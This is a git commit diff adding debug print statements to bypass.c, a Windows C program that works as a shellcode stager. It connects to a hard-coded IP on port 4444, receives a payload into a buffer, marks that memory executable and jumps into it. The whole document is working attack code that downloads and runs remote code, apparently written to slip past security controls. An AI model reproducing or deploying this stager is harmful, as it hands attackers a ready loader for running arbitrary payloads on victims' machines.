e2e9bdb154742a3b2c3762b300e07a3726559faa
Stephen Haywood <stephen@averagesecurityguy.info>
2012-03-07 22:51:45 -0500

    Debugging bypass

--- bypass.c
+++ bypass.c
@@ -1,5 +1,6 @@
 #include <windows.h>
 #include <winsock2.h>
+#include <stdio.h>
 
 #define IP_ADDRESS "10.230.229.13"
 #define PORT 4444
@@ -12,9 +13,10 @@ int main() {
   wResult = WSAStartup(MAKEWORD(2,2), &wsaData);
   if (wResult != 0) {
     return 1;
-  }
+  };
 
   // Create a socket to connect to an IP and port
+  printf("Creating socket...\n");
   SOCKET ConnectSocket = INVALID_SOCKET;
   ConnectSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
 
@@ -23,19 +25,24 @@ int main() {
   saServer.sin_addr.s_addr = inet_addr(IP_ADDRESS);
   saServer.sin_port = htons(PORT);
 
+  printf("Connecting to %s on port %d.\n", IP_ADDRESS, PORT);
   connect( ConnectSocket, (SOCKADDR*) &saServer, sizeof(saServer) );
 
   // Receive data from port
   char data[819200] = "";
   int res;
-
+  printf("Receiving");
   do {
     res = recv( ConnectSocket, data, 512, 0 );
+    printf(".");
   } while (res > 0);
+  printf("Received payload with size of %s.\n", sizeof(data));
 
+  printf("Allocating RWX memory.\n");
   // Allocate RWX memory for the data
   VirtualProtect(data, sizeof(data),PAGE_EXECUTE_READWRITE,NULL);
 
+  printf("Executing payload.\n");
   // Execute the received payload
   (*(void(*)()) data)();
 }
